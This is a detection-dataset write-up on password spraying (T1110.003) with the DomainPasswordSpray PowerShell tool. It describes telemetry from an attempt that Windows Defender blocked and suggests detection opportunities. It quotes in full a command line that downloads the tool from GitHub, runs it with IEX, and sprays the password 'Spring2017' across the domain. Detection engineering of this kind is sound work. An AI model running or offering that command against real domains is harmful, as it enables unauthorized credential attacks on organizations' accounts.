# T1110.003-2: Password Spraying — Password Spray - DomainPasswordSpray

## Technique Context

Password spraying (T1110.003) is a credential access technique where adversaries attempt authentication against multiple user accounts using a single common password or small set of passwords. Unlike brute force attacks that target one account with many passwords, password spraying distributes attempts across many accounts to avoid lockout policies. This technique is particularly effective against organizations with weak password policies or common passwords like "Spring2017", "Password123", or seasonal variations.

The detection community focuses on identifying patterns of authentication failures across multiple accounts from single sources, PowerShell-based credential validation tools, and domain enumeration activities that typically precede password spray attacks. DomainPasswordSpray by @dafthack is a well-known PowerShell tool that automates this process by enumerating domain users, checking lockout policies, and systematically attempting authentication.

## What This Dataset Contains

This dataset captures an attempted execution of the DomainPasswordSpray tool that was blocked by Windows Defender. The key evidence includes:

**Process Creation Chain (Security 4688/Sysmon 1):**
- Parent PowerShell spawning child PowerShell with command: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force}`
- Whoami.exe execution for user enumeration

**PowerShell Activity:**
- Web request to GitHub for DomainPasswordSpray.ps1 tool download
- AMSI/Defender block with error: `"This script contains malicious content and has been blocked by your antivirus software"`
- The complete DomainPasswordSpray function code captured in PowerShell 4103/4104 events before blocking

**Network/Tool Indicators:**
- TLS 1.2 configuration for secure download
- Direct GitHub URL for DomainPasswordSpray tool
- Command line parameters showing password "Spring2017" and domain targeting

## What This Dataset Does Not Contain

The dataset lacks actual password spray execution telemetry because Windows Defender successfully blocked the tool before it could execute. Missing elements include:

- No authentication attempts (Security 4625 failures)
- No LDAP queries for domain user enumeration
- No domain lockout policy queries via `net accounts`
- No actual credential validation attempts against domain controllers
- Limited network activity due to early termination

The tool's core functionality was prevented from executing, so while we see the delivery mechanism and tool acquisition, we don't observe the password spraying behavior itself.

## Assessment

This dataset provides excellent visibility into the initial stages of a password spray attack, particularly the tool acquisition and setup phase. The PowerShell logging captured the complete source code of the DomainPasswordSpray tool, providing comprehensive insight into its capabilities and intended execution flow. Security 4688 events with command-line logging offer clear evidence of the attack parameters including target password and domain.

However, the dataset's utility for building detection rules around actual password spraying behavior is limited since Defender prevented execution. It's more valuable for detecting the preparation phase and tool delivery mechanisms rather than the credential access attempts themselves.

## Detection Opportunities Present in This Data

1. **PowerShell Web Request Patterns** - Monitor for PowerShell downloading security tools from GitHub, especially with Invoke-WebRequest to raw.githubusercontent.com URLs containing "password" or "spray" keywords

2. **Known Malicious Tool URLs** - Alert on downloads from the specific DomainPasswordSpray GitHub repository or similar credential attack tool repositories

3. **PowerShell IEX with Remote Content** - Detect Invoke-Expression (IEX) commands that execute remotely downloaded content, particularly when combined with Invoke-WebRequest

4. **Credential Attack Tool Command Lines** - Monitor process creation for PowerShell commands containing "DomainPasswordSpray", "Invoke-DomainPasswordSpray", or similar credential attack function names

5. **TLS Protocol Manipulation** - Flag PowerShell scripts that explicitly set SecurityProtocol to TLS 1.2 before downloading content, as this is common in attack tools

6. **Password Parameters in Command Lines** - Detect command-line arguments containing "-Password" parameters in PowerShell execution, especially with common spray passwords

7. **AMSI/Defender Malware Blocks** - Correlate PowerShell error events indicating "malicious content blocked" with preceding web requests to identify blocked attack attempts

8. **Domain Parameter Usage** - Monitor for PowerShell commands using environment variables like $Env:USERDOMAIN in credential attack contexts
